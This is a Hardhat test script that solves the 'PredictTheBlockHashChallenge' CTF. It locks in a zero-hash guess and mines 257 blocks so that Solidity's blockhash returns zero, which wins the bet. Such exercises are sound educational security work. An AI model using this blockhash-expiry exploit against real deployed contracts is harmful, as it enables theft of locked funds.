import { expect } from "chai";
import { ethers } from "hardhat";

describe("PredictTheBlockHashChallenge", () => {
  it("Solves the challenge", async () => {
    const amount = ethers.parseEther("1");

    // deploy contract
    const factory = await ethers.getContractFactory(
      "PredictTheBlockHashChallenge"
    );
    const contract = await factory.deploy({ value: amount });
    await contract.waitForDeployment();

    console.log(`contract deployed to ${contract.target}`);

    // guess "0x0000000000000000000000000000000000000000000000000000000000000000"
    const guess = await contract.lockInGuess(
      "0x0000000000000000000000000000000000000000000000000000000000000000",
      { value: amount }
    );
    await guess.wait();

    // mine until block 257
    for (let i = 0; i < 257; i++) {
      await ethers.provider.send("evm_mine");
      console.log("block mined");
    }

    // call settle after block 256
    await contract.settle();

    expect(await contract.isComplete()).to.be.true;
  });
});
